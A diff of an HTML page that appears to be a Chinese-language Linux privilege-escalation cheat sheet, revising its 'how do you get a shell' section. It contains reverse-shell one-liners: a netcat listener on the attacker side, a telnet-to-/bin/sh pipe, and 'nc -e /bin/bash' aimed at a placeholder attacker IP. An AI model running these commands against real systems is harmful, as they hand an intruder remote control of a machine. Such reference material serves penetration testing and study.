@@ -162,10 +162,22 @@
 
 
 <h3 id="getshell">你如何get一个shell？你如何与系统进行交互？</h3>
-<div class="hlcode"><pre><span class="cp"># http:</span><span class="c1">//lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</span>
-<span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4444</span>    <span class="err">#</span> <span class="n">Attacker</span><span class="p">.</span> <span class="err">输入</span> <span class="p">(</span><span class="err">命令</span><span class="p">)</span>
-<span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4445</span>    <span class="err">#</span> <span class="n">Attacker</span><span class="p">.</span> <span class="err">输出</span><span class="p">(</span><span class="err">结果</span><span class="p">)</span>
-<span class="n">telnet</span> <span class="p">[</span><span class="n">atackers</span> <span class="n">ip</span><span class="p">]</span> <span class="mi">44444</span> <span class="o">|</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">|</span> <span class="p">[</span><span class="n">local</span> <span class="n">ip</span><span class="p">]</span> <span class="mi">44445</span>    <span class="err">#</span> <span class="err">在目标系统上</span><span class="p">.</span> <span class="err">使用</span> <span class="err">攻击者的</span><span class="n">IP</span><span class="o">!</span>
+<div class="hlcode"><pre><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">:</span>
+<span class="cp"># http:</span><span class="c1">//lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</span>
+
+<span class="cp"># Attacker. 输入 (命令)</span>
+<span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4444</span>    
+<span class="cp"># Attacker. 输出(结果)</span>
+<span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4445</span>    
+<span class="cp"># 在目标系统上. 使用 攻击者的IP!</span>
+<span class="n">telnet</span> <span class="p">[</span><span class="n">attacker</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">ip</span><span class="p">]</span> <span class="mi">44444</span> <span class="o">|</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">|</span> <span class="p">[</span><span class="n">local</span> <span class="n">ip</span><span class="p">]</span> <span class="mi">44445</span>
+
+<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">:</span>
+<span class="cp"># Attacker 输入命令，输出结果</span>
+<span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4444</span>  
+
+<span class="cp"># 目标系统</span>
+<span class="n">nc</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span> <span class="n">attacker_ip</span> <span class="mi">4444</span>
 </pre></div>
 
 
